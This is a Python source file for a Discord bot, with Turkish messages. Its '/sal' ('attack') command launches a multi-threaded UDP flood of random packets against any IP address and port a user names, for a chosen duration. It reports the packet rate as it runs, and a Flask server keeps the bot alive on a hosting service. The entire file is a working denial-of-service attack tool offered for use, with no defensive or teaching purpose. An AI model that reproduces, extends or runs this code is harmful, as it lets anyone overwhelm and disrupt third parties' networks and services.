import discord
from discord.ext import commands
import socket
import threading
import time
import os
import random
from dotenv import load_dotenv
from flask import Flask
from threading import Thread

load_dotenv()

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

stop_event = threading.Event()
sent = 0
lock = threading.Lock()

def flood(target, port):
    global sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = os.urandom(1024)
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (target, port))
            with lock:
                sent += 1
        except:
            pass
    sock.close()

@bot.event
async def on_ready():
    print(f"[*] {bot.user} olarak giris yapildi.")
    await bot.tree.sync()

@bot.tree.command(name="sal", description="UDP Flood baslatir")
async def sal(interaction: discord.Interaction, ip: str, port: int, saniye: int, thread: int):
    global sent
    await interaction.response.send_message(f"🚀 **Saldiri baslatildi!**\nHedef: `{ip}:{port}`\nSure: `{saniye}` sn | Thread: `{thread}`", ephemeral=False)
    
    stop_event.clear()
    sent = 0
    
    for _ in range(thread):
        t = threading.Thread(target=flood, args=(ip, port), daemon=True)
        t.start()

    # Istatistikleri guncelle
    start_time = time.time()
    while time.time() - start_time < saniye and not stop_event.is_set():
        await discord.utils.sleep_until(discord.utils.utcnow() + discord.utils.timedelta(seconds=1))
        elapsed = time.time() - start_time
        pps = sent / elapsed if elapsed > 0 else 0
        await interaction.edit_original_response(content=f"🚀 **Saldiri devam ediyor!**\nHedef: `{ip}:{port}`\nGiden: `{sent}` paket | `~{pps:.0f} pps`\nKalan: `{int(saniye - elapsed)}` sn")

    stop_event.set()
    await interaction.edit_original_response(content=f"🛑 **Saldiri bitti!**\nHedef: `{ip}:{port}`\nToplam giden: `{sent}` paket.")

@bot.tree.command(name="dur", description="Saldiriyi durdurur")
async def dur(interaction: discord.Interaction):
    stop_event.set()
    await interaction.response.send_message("🛑 Saldiri durduruldu.")

# Render'in uyumamasi icin Flask
app = Flask('')
@app.route('/')
def home(): return "Bot aktif!"
def run(): app.run(host='0.0.0.0', port=8080)
def keep_alive(): Thread(target=run).start()

if __name__ == "__main__":
    keep_alive()
    bot.run(os.getenv("DISCORD_TOKEN"))
